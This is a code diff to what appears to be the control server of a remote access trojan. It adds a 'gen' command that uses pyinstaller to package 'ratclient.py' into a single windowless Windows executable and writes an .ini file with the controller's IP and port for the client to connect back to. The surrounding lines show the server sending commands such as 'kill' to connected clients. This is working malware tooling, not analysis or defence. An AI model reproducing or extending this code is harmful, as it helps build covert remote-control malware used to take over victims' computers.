@@ -1,5 +1,6 @@
 import inspect
 import json
+import os.path
 import shlex
 import socket
 import subprocess
@@ -133,7 +134,6 @@ class Server:
             conn.send_command('kill')
 
     def process_command(self, cmd, conn, executor):
-        # grep_pattern = r'\s*\|\s*grep\s+(\w+)\s*$'
         grep_pattern = r'\s*\|\s*grep\s+(.+)\s*$'
         match = re.search(grep_pattern, cmd)
         if match:
@@ -233,6 +233,8 @@ class Server:
                 # 切换目录
                 elif name == 'cd':
                     print(cd(arg))
+                elif name == 'gen':
+                    gen(arg)
                 # 与指定客户端交互
                 else:
                     try:
@@ -291,6 +293,23 @@ class Server:
         func = partial(conn.send_command, command)
         for i in func():
             yield i
+
+
+def gen(address_port_str):
+    exit_code = subprocess.Popen("pyinstaller -Fw ratclient.py -i NONE", shell=True).wait()
+    if exit_code == 0:
+        print(f'Executable generated successfully: {os.path.abspath("dist/ratclient.exe")}')
+    else:
+        raise Exception(f"Error occurred while running pyinstaller. Exit code: {exit_code}")
+
+    if address_port_str.strip():
+        parts = address_port_str.split(':')
+        if len(parts) == 2:
+            ip_address = parts[0]
+            port = int(parts[1])
+            with open('dist/ratclient.ini', 'wt') as file:
+                file.write(f'[default]\nip = {ip_address}\nport = {port}')
+            print(f'Configuration file generated successfully: {os.path.abspath("dist/ratclient.ini")}')
 
 
 if __name__ == '__main__':
